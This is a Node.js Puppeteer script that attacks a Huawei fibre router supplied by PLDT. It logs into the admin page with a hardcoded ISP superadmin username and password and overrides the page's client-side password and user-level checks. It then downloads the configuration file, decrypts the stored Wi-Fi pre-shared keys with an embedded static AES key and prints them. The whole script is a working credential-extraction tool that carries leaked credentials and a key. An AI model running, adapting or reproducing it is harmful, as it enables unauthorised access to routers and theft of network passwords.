const puppeteer = require('puppeteer');
const crypto = require('crypto');
const fs = require('fs');

const KEY_HEX = '6fc6e3436a53b6310dc09a475494ac774e7afb21b9e58fc8e58b5660e48e2498';
const BLOCK_SIZE = 0x14;

function decryptHuawei(encryptedStr) {
  if (!encryptedStr.startsWith('$2') || !encryptedStr.endsWith('$')) return null;
  const trimmed = encryptedStr.substring(2, encryptedStr.length - 1);
  const buf = Buffer.from(trimmed, 'ascii');
  for (let i = 0; i < buf.length; i++) {
    if (buf[i] === 0x7e) buf[i] = 0x1e;
    else buf[i] -= 0x21;
  }
  if (buf.length % BLOCK_SIZE !== 0) return null;
  const bc = Math.floor(buf.length / BLOCK_SIZE);
  const ivRaw = HW_AES_PlainToBin(buf.slice(bc * BLOCK_SIZE - BLOCK_SIZE));
  const data = HW_AES_PlainToBin(buf.slice(0, bc * BLOCK_SIZE - BLOCK_SIZE));
  const d = crypto.createDecipheriv('aes-256-cbc', Buffer.from(KEY_HEX, 'hex'), ivRaw);
  d.setAutoPadding(false);
  let dec = Buffer.concat([d.update(data), d.final()]);
  const pad = dec[dec.length - 1];
  if (pad > 0 && pad <= 16) dec = dec.slice(0, dec.length - pad);
  return dec.toString('utf8').replace(/\0+$/, '');
}

function HW_AES_AesEnhSysToLong(buf) {
  let out = 0, v3 = 1;
  for (let i = 0; i < 5; i++) { out += v3 * buf[i]; v3 *= 0x5D; }
  return out;
}

function HW_AES_PlainToBin(buf) {
  if (buf.length % 5 !== 0) return null;
  const out = Buffer.alloc(buf.length * 4 / 5);
  let pos = 0;
  for (let i = 0; i < out.length; i += 4) {
    out.writeUInt32LE(HW_AES_AesEnhSysToLong(buf.slice(pos, pos+5)), i);
    pos += 5;
  }
  return out;
}

(async () => {
  const b = await puppeteer.launch({headless:false, ignoreHTTPSErrors:true, args:['--no-sandbox','--ignore-certificate-errors','--window-size=1024,768']});
  const [p] = await b.pages();

  let sessionCookie = null;
  p.on('response', async res => {
    if (res.url().includes('login.cgi')) {
      const sc = res.headers()['set-cookie'];
      if (sc) { const m = sc.match(/Cookie=([^;]+)/); if (m) sessionCookie = m[1]; }
    }
  });

  // Capture cfgfiledown.cgi response using text() instead of buffer()
  p.on('response', async res => {
    if (res.url().includes('cfgfiledown.cgi')) {
      console.log('Captured cfgfiledown.cgi response');
      try {
        const text = await res.text();
        const buf = Buffer.from(text, 'binary');
        console.log('Response size:', buf.length, 'bytes');
        
        if (buf.length > 5000) {
          // This is the actual config file, not an error page
          const xmlStr = buf.toString('utf8');
          const ssid24 = xmlStr.match(/InstanceID="1"[^>]*?SSID="([^"]+)"/);
          const ssid5g = xmlStr.match(/InstanceID="5"[^>]*?SSID="([^"]+)"/);
          
          const pskMatches = [...xmlStr.matchAll(/PreSharedKey="([^"]+)"/g)];
          if (pskMatches.length >= 2) {
            const e24 = '$2' + pskMatches[0][1] + '$';
            const e5g = '$2' + pskMatches[1][1] + '$';
            const d24 = decryptHuawei(e24);
            const d5g = decryptHuawei(e5g);
            console.log('\n=== DECRYPTED PASSWORDS ===');
            console.log('2.4GHz (' + (ssid24 ? ssid24[1] : 'PLDTHOMEFIBRBd6BN') + '): ' + d24);
            console.log('5GHz (' + (ssid5g ? ssid5g[1] : '...') + '): ' + d5g);
          }
        } else {
          console.log('Got error page instead of config. Headers:', JSON.stringify(res.headers()));
        }
      } catch(e) {
        console.log('Error reading response:', e.message);
      }
    }
  });

  await p.goto('https://192.168.1.1/admin.html', {waitUntil:'domcontentloaded', timeout:30000});
  await new Promise(r => setTimeout(r,2000));
  await p.evaluate(() => { window.setDisable = () => {}; window.CheckPassword = () => 0; window.Userlevel = 0; window.preflag = 0; });
  if (await p.$('input#txt_Username')) {
    await p.type('input#txt_Username','adminpldt',{delay:15});
    await p.type('input#txt_Password','AC2DIU7QW3ERTY6UPAS4DFG',{delay:15});
    await p.click('button#button');
    await new Promise(r => setTimeout(r,3000));
  }

  if (sessionCookie) await p.setCookie({ name:'Cookie', value:sessionCookie, domain:'192.168.1.1', path:'/', httpOnly:true, secure:true });

  await p.goto('https://192.168.1.1/html/ssmp/cfgfile/cfgfile.asp', {waitUntil:'domcontentloaded', timeout:15000});
  await new Promise(r => setTimeout(r,4000));

  // Click download button
  await p.evaluate(() => {
    document.getElementById('downloadconfigbutton').click();
  });

  console.log('Waiting for download...');
  await new Promise(r => setTimeout(r, 10000));

  await new Promise(() => {});
})().catch(e => { console.error(e); process.exit(1); });
